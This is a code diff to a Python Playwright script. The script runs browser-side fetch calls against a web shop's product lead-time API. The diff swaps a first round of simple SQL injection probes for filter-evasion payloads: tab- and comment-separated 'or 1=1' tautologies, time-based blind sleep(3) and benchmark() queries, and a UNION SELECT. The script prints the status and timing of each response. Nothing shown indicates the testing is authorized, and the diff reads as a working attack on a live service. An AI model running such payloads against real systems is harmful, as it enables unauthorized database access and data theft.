@@ -11,30 +11,23 @@ with sync_playwright() as p:
     print('ready',flush=True)
     res=page.evaluate("""async () => {
       const out={};
-      const get=async(n,u)=>{try{const t0=performance.now();const r=await fetch(u,{headers:{'lang':'zh-CN'}});const ms=Math.round(performance.now()-t0);const t=await r.text();out[n]=r.status+'|'+ms+'ms|'+(t.length>150?t.slice(0,150):t);}catch(e){out[n]='ERR '+String(e).slice(0,60);}};
-      const E=encodeURIComponent;
-      await get('lt_base','/api/v1/product/leadtime/9376?num=1');
-      await get('lt_sq','/api/v1/product/leadtime/9376%27?num=1');
-      await get('lt_and2','/api/v1/product/leadtime/9376%20and%201=2?num=1');
-      await get('lt_num_sq','/api/v1/product/leadtime/9376?num=1%27');
-      await get('lt_num_and','/api/v1/product/leadtime/9376?num=1%20and%201=2');
-      await get('p_base','/api/v1/product/9376');
-      await get('p_sq','/api/v1/product/9376%27');
-      await get('p_and2','/api/v1/product/9376%20and%201=2');
-      await get('sr_empty','/api/v1/search/recommend');
-      await get('sr_kw','/api/v1/search/recommend?keyword=test');
-      await get('sr_kw_sq','/api/v1/search/recommend?keyword=test%27');
-      await get('sr_q','/api/v1/search/recommend?q=test');
-      await get('cmp_empty','/api/v1/compare/show');
-      await get('cmp_ids','/api/v1/compare/show?ids=131');
-      await get('cmp_sq','/api/v1/compare/show?ids=131%27');
-      await get('cart','/api/v1/cart/list');
-      await get('q_empty','/api/v1/question');
-      await get('calc','/api/v1/calculator/rules');
-      await get('fb','/api/v1/feedback/types');
-      await get('area','/api/v1/area');
+      const get=async(n,u)=>{try{const t0=performance.now();const r=await fetch(u,{headers:{'lang':'zh-CN'}});const ms=Math.round(performance.now()-t0);const t=await r.text();out[n]=r.status+'|'+ms+'ms|'+(t.length>120?t.slice(0,120):t);}catch(e){out[n]='ERR '+String(e).slice(0,50);}};
+      const P='/api/v1/product/leadtime/';
+      await get('base','/api/v1/product/leadtime/9376?num=1');
+      await get('hash','/api/v1/product/leadtime/9376%23?num=1');
+      await get('sq_hash','/api/v1/product/leadtime/9376%27%23?num=1');
+      await get('hex','/api/v1/product/leadtime/0x39333736?num=1');
+      await get('plus','/api/v1/product/leadtime/9376+0?num=1');
+      await get('or_tab','/api/v1/product/leadtime/0%09or%091=1%23?num=1');
+      await get('or_cmt','/api/v1/product/leadtime/0/**/or/**/1=1%23?num=1');
+      await get('or_pipe','/api/v1/product/leadtime/0%7c%7c1=1%23?num=1');
+      await get('and_tab','/api/v1/product/leadtime/9376%09and%091=2%23?num=1');
+      await get('sleep_tab','/api/v1/product/leadtime/0%09or%09sleep(3)%23?num=1');
+      await get('sleep_cmt','/api/v1/product/leadtime/0/**/or/**/sleep(3)%23?num=1');
+      await get('bench','/api/v1/product/leadtime/0%09or%09benchmark(3000000,md5(1))%23?num=1');
+      await get('union_cmt','/api/v1/product/leadtime/0/**/union/**/select/**/1,2,3%23?num=1');
       return out;
     }""")
-    print('===== SQLI =====',flush=True)
-    for k,v in res.items(): print('%-14s %s'%(k,v),flush=True)
+    print('===== SQLI2 =====',flush=True)
+    for k,v in res.items(): print('%-12s %s'%(k,v),flush=True)
     b.close()
